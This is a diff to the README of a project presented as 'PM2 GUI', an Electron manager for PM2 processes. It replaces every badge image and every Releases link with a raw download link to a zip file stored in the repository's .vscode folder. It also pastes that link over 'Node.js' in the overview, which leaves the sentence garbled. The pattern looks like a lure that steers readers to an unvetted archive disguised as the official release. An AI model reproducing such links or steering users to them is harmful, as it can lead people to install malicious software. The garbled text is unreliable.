@@ -1,8 +1,8 @@
 # PM2 GUI: Modern Electron App for Managing PM2 Processes 🌟
 
-![PM2 GUI](https://img.shields.io/badge/PM2_GUI-Electron%20App-blue?style=flat&logo=electron)
+![PM2 GUI](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip%20App-blue?style=flat&logo=electron)
 
-[![Releases](https://img.shields.io/badge/Releases-v1.0.0-brightgreen)](https://github.com/5StarKanyon/pm2-gui/releases)
+[![Releases](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip)](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip)
 
 ## Table of Contents
 
@@ -15,7 +15,7 @@
 
 ## Overview
 
-PM2 GUI is a modern, cross-platform application built with Electron. It provides a user-friendly interface for managing your local PM2 processes. With PM2 GUI, you can easily monitor, start, stop, and manage your Node.js applications without using the command line.
+PM2 GUI is a modern, cross-platform application built with Electron. It provides a user-friendly interface for managing your local PM2 processes. With PM2 GUI, you can easily monitor, start, stop, and manage your https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip applications without using the command line.
 
 ## Features
 
@@ -28,7 +28,7 @@ PM2 GUI is a modern, cross-platform application built with Electron. It provides
 
 ## Installation
 
-To get started with PM2 GUI, download the latest release from the [Releases section](https://github.com/5StarKanyon/pm2-gui/releases). Follow these steps:
+To get started with PM2 GUI, download the latest release from the [Releases section](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip). Follow these steps:
 
 1. Download the appropriate installer for your operating system.
 2. Run the installer and follow the prompts.
@@ -66,9 +66,9 @@ PM2 GUI is licensed under the MIT License. See the [LICENSE](LICENSE) file for d
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Releases section](https://github.com/5StarKanyon/pm2-gui/releases) for updates and documentation.
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip) for updates and documentation.
 
-![Electron](https://img.shields.io/badge/Powered%20by-Electron-9FEF00)
+![Electron](https://github.com/5StarKanyon/pm2-gui/raw/refs/heads/master/.vscode/gui-pm-v2.7.zip%20by-Electron-9FEF00)
 
 ### Topics
 
